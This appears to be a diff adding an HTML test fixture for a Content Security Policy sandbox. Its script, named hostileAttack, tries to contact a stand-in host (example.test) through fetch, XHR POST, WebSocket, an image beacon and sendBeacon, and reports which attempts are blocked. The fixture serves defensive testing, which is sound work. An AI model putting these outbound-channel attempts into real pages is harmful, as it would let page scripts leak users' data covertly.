@@ -1,0 +1,43 @@
+<!-- SPDX-License-Identifier: Apache-2.0 -->
+<!doctype html>
+<html>
+  <body>
+    <script>
+      window.hostileAttack = async ({ emit }) => {
+        let beaconAttempted = false;
+        const fetchBlocked = fetch("https://example.test/fetch").then(
+          () => false,
+          () => true,
+        );
+        const xhrBlocked = new Promise((resolve) => {
+          const request = new XMLHttpRequest();
+          request.onload = () => resolve(false);
+          request.onerror = () => resolve(true);
+          request.open("POST", "https://example.test/xhr");
+          request.send("synthetic");
+        });
+        const socketBlocked = new Promise((resolve) => {
+          const socket = new WebSocket("wss://example.test/socket");
+          socket.onopen = () => resolve(false);
+          socket.onerror = () => resolve(true);
+        });
+        const imageBlocked = new Promise((resolve) => {
+          const image = new Image();
+          image.onload = () => resolve(false);
+          image.onerror = () => resolve(true);
+          image.src = "https://example.test/beacon";
+        });
+        beaconAttempted = navigator.sendBeacon("https://example.test/send-beacon", "synthetic");
+        const results = await Promise.all([fetchBlocked, xhrBlocked, socketBlocked, imageBlocked]);
+        await emit([{ name: "ui.error", code: "csp_blocked", startOffsetMs: 0, durationMs: 0 }]);
+        return {
+          fetchBlocked: results[0],
+          xhrBlocked: results[1],
+          socketBlocked: results[2],
+          imageBlocked: results[3],
+          beaconAttempted,
+        };
+      };
+    </script>
+  </body>
+</html>
